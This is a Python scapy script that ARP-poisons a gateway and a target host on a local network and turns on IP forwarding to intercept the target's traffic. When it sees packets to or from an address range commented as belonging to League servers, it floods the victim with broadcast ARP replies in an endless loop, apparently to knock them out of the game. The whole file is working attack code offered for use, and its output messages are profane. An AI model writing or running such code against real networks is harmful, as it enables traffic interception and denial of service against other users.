#192.64.168.0 - 192.64.175.255
import time, sys, argparse
from scapy.all import *
def LeagueCanceller(pkt, targets, interface, MACs):
    print(pkt.summary())
    print(f'The destination ip is {pkt[IP].dst}')
    print(f'The source ip is {pkt[IP].src}')
    if(isLeagueIP(pkt[IP].dst) or isLeagueIP(pkt[IP].src)):
        while 1:
            print("FUCK YOU DWEEB")
            print(f'the targets are {targets} and the interface is {interface}')
            DDoSButBased(targets, interface, MACs)
class PreAttack(object):
    def __init__(self, targ, iface):
        self.target = targ
        self.interface = iface
    def getMacNCheese(self):
        return srp(Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=self.target),
        timeout=10, iface=self.interface)[0][0][1][ARP].hwsrc
    class togggleIPForward(object):
        def __init__(self, path='/proc/sys/net/ipv4/ip_forward'):
            self.path = path
        def enableIPForward(self):
            with open(self.path, 'wb') as file:
                file.write('1')
            return 0
        def disableIPForward(self):
            with open(self.path, 'wb') as file:
                file.write('0')
            return 0
class Attack(object):
    def __init__(self, targs, iface):
        self.targ1 = targs[0]
        self.targ2=targs[1]
        self.iface = iface
    def KuzcosPoison(self, MacNCheese):
        send(ARP(op=2, pdst=self.targ1, psrc=self.targ2, hwdst=MacNCheese[0]), iface=self.iface)
        send(ARP(op=2, pdst=self.targ2, psrc=self.targ1, hwdst=MacNCheese[1]), iface=self.iface)
    def FixItFelix(self, MacNCheese):
        send(ARP(op=2, pdst=self.targ1, psrc=self.targ2, hwdst='ff:ff:ff:ff:ff:ff',hwsrc=MacNCheese[0]), iface=self.iface)
        send(ARP(op=2, pdst=self.targ2, psrc=self.targ1, hwdst='ff:ff:ff:ff:ff:ff',hwsrc=MacNCheese[1]), iface=self.iface)
            
def Rosie(interface, gWayT, target, fwd):
    if ((not target) or (not gWayT)):
        print("Fucking add some arguments damn\n")
        sys.exit(1)
    #Setting up attack
    targets = [gWayT, target]
    try:
        MACs = [PreAttack(targets[0], interface).getMacNCheese(), PreAttack(targets[1], interface).getMacNCheese()] 
        print('[POGGED]')
    except Exception:
        print('[FUCK]\n no address(es)')
        sys.exit(1);
    try:
        if fwd:
            PreAttack.togggleIPForward().enableIPForward()
            print("[POGGED]")
    except IOError:
        print('[FUCK]')
        try:
            choice = raw_input('Proceed? [y/N]').strip().lower()[0]
            if choice == 'y':
                pass
            elif choice == 'n':
                print('Shutting down')
                sys.exit(1)
            else:
                print('There were two options, buddy')
                sys.exit(1)
        except KeyboardInterrupt:
            sys.exit(1)
    # Attack is setup now
    while 1:
       try:
           try:
               Attack(targets, interface).KuzcosPoison(MACs)
               sniff(count=5, prn=lambda x:LeagueCanceller(x, targets, interface, MACs), filter=f'host {targets[1]}')
               #sniff(prn=lambda x:x.summary(), count=1)
           except Exception:
               print('Failed to poison')
               sys.exit(1)
           print('poison sent to %s and %s' %(targets[0], targets[1]))
           time.sleep(2.5)
       except KeyboardInterrupt:
           break;
    #fix the ARP tables
    DDoSButBased(targets, interface, MACs)
    try:
        if fwd:
            print('Disable IP forwarding')
            sys.stdout.flush()
            PreAttack.togggleIPForward().disableIPForward()
            print('[POGGED]')
    except IOError:
        print('[FUCK]')

def DDoSButBased(targets, interface, MACs):
    for i in range(0,16):
        try:
            Attack(targets, interface).FixItFelix(MACs)
            #sniff(prn=lambda x:x.summary(), count=1)
        except(Exception, KeyboardInterrupt):
            print('[FUCK]')
            sys.exit(1)
        time.sleep(2)
    print('[POGGED]')

def isLeagueIP(ipAddr):
    ip = ipAddr.split('.')
    return ip[0] == "192" and ip[1] == "64" and int(ip[2]) >=168 and int(ip[2]) <= 175